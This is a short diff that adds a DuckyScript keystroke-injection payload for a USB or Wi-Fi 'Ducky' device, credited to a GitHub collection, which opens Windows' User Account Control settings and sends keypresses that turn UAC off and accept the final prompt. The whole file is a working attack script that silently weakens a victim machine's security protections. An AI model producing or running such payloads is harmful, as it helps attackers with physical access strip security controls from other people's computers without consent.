@@ -1,0 +1,27 @@
+REM Written by HonkinWaffles https://github.com/HonkinWaffles/Wi-Fi-Ducky-Scripts
+REM Disable UAC
+
+REM !! REQUIREMENTS !!
+REM Default or disabled UAC
+
+REM Open UAC Controll App
+GUI r
+STRING useraccountcontrolsettings
+ENTER
+DELAY 1000
+
+REM Navigate through the UAC application
+DOWN
+ENTER
+DOWN
+DOWN
+ENTER
+TAB
+ENTER
+
+REM Accept final UAC prompt
+DELAY 500
+LEFT
+LEFT
+DELAY 500
+ENTER
